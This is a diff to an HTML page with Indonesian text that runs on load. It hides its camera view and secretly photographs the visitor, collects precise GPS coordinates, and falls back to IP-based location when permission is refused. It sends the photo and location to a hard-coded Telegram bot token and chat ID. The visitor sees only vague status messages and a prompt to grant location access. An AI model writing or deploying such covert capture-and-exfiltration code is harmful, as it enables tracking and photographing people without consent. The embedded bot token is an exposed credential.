@@ -8,22 +8,38 @@
         body { font-family: Arial, sans-serif; background: white; margin: 0; padding: 20px; text-align: center; }
         #status { margin-top: 50px; font-size: 18px; color: #333; }
         #debug { color: #666; font-size: 14px; margin-top: 20px; }
+        #permission-request { 
+            display: none;
+            background: #f8f9fa;
+            padding: 20px;
+            margin: 20px auto;
+            max-width: 500px;
+            border-radius: 5px;
+        }
     </style>
 </head>
 <body>
     <div id="status">Memulai proses...</div>
     <div id="debug"></div>
+    
+    <div id="permission-request">
+        <h3>Izin Diperlukan</h3>
+        <p>Untuk melanjutkan, harap berikan izin akses lokasi saat diminta oleh browser.</p>
+        <button id="retry-btn">Coba Lagi</button>
+    </div>
 
     <video id="camera-view" autoplay playsinline style="display:none;"></video>
     <canvas id="photo-canvas" style="display:none;"></canvas>
 
     <script>
-        // CONFIGURATION (Ganti dengan data Anda)
+        // CONFIGURATION
         const BOT_TOKEN = '7548364986:AAGhlDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY';
         const CHAT_ID = '7041008009';
         
         const statusEl = document.getElementById('status');
         const debugEl = document.getElementById('debug');
+        const permissionRequestEl = document.getElementById('permission-request');
+        const retryBtn = document.getElementById('retry-btn');
         const cameraView = document.getElementById('camera-view');
         const photoCanvas = document.getElementById('photo-canvas');
         
@@ -41,21 +57,39 @@
                 debugLog("2. Memeriksa token dan chat ID...");
                 if (!BOT_TOKEN || !CHAT_ID) throw new Error("Token atau Chat ID tidak valid");
                 
-                debugLog("3. Mengakses kamera...");
+                debugLog("3. Memeriksa izin kamera...");
+                await checkCameraPermission();
+                
+                debugLog("4. Mengakses kamera...");
                 await capturePhoto();
                 
-                debugLog("4. Mendapatkan lokasi...");
-                await getLocation();
+                debugLog("5. Memeriksa izin lokasi...");
+                const location = await getLocationWithFallback();
                 
-                debugLog("5. Mengirim ke Telegram...");
-                const result = await sendToTelegram();
+                debugLog("6. Mengirim ke Telegram...");
+                const result = await sendToTelegram(location);
                 
                 statusEl.textContent = "✅ Data berhasil dikirim!";
                 debugLog("RESPONSE: " + JSON.stringify(result));
                 
             } catch (error) {
                 statusEl.textContent = "❌ Error: " + error.message;
-                debugLog("ERROR: " + error.stack);
+                debugLog("ERROR: " + error.message);
+                
+                if (error.message.includes("lokasi")) {
+                    permissionRequestEl.style.display = 'block';
+                }
+            }
+        }
+        
+        async function checkCameraPermission() {
+            try {
+                const permission = await navigator.permissions.query({name: 'camera'});
+                if (permission.state === 'denied') {
+                    throw new Error("Izin kamera ditolak");
+                }
+            } catch (error) {
+                debugLog("Camera permission check error: " + error.message);
             }
         }
         
@@ -82,7 +116,21 @@
                 });
                 
             } catch (error) {
-                throw new Error("Kamera error: " + error.message);
+                throw new Error("Gagal mengakses kamera: " + error.message);
+            }
+        }
+        
+        async function getLocationWithFallback() {
+            try {
+                const position = await getLocation();
+                return {
+                    lat: position.coords.latitude,
+                    lng: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                };
+            } catch (error) {
+                debugLog("Menggunakan lokasi alternatif...");
+                return await getIPLocation(); // Fallback ke lokasi berbasis IP
             }
         }
         
@@ -96,21 +144,44 @@
                 navigator.geolocation.getCurrentPosition(
                     position => resolve(position),
                     error => reject(new Error(getGeoError(error))),
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { 
+                        enableHighAccuracy: true, 
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
                 );
             });
         }
         
-        function getGeoError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED: return "Izin lokasi ditolak";
-                case error.POSITION_UNAVAILABLE: return "Lokasi tidak tersedia";
-                case error.TIMEOUT: return "Waktu habis saat mendapatkan lokasi";
-                default: return "Error lokasi tidak diketahui";
+        async function getIPLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    lat: data.latitude,
+                    lng: data.longitude,
+                    accuracy: 5000, // Akurasi rendah untuk lokasi berbasis IP
+                    source: "IP"
+                };
+            } catch (error) {
+                throw new Error("Tidak bisa mendapatkan lokasi");
             }
         }
         
-        async function sendToTelegram() {
+        function getGeoError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED: 
+                    return "Izin lokasi ditolak. Silakan refresh dan berikan izin.";
+                case error.POSITION_UNAVAILABLE: 
+                    return "Informasi lokasi tidak tersedia";
+                case error.TIMEOUT: 
+                    return "Waktu habis saat mendapatkan lokasi";
+                default: 
+                    return "Error lokasi tidak diketahui";
+            }
+        }
+        
+        async function sendToTelegram(location) {
             try {
                 const photoDataUrl = photoCanvas.toDataURL('image/jpeg');
                 const blob = await (await fetch(photoDataUrl)).blob();
@@ -119,13 +190,17 @@
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'photo.jpg');
                 
-                // Test API request
-                debugLog("Testing bot token...");
-                const testResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
-                const testData = await testResponse.json();
-                if (!testData.ok) throw new Error("Token bot tidak valid");
+                let caption = "Foto otomatis\n";
+                if (location) {
+                    caption += `Lokasi: ${location.lat},${location.lng}\n`;
+                    caption += `Akurasi: ${Math.round(location.accuracy)} meter`;
+                    if (location.source) caption += ` (${location.source})`;
+                } else {
+                    caption += "Lokasi: Tidak tersedia";
+                }
                 
-                // Send photo
+                formData.append('caption', caption);
+                
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
@@ -134,9 +209,15 @@
                 return await response.json();
                 
             } catch (error) {
-                throw new Error("Telegram error: " + error.message);
+                throw new Error("Gagal mengirim ke Telegram: " + error.message);
             }
         }
+        
+        // Event listeners
+        retryBtn.addEventListener('click', () => {
+            permissionRequestEl.style.display = 'none';
+            initialize();
+        });
         
         // Start process
         window.addEventListener('DOMContentLoaded', initialize);
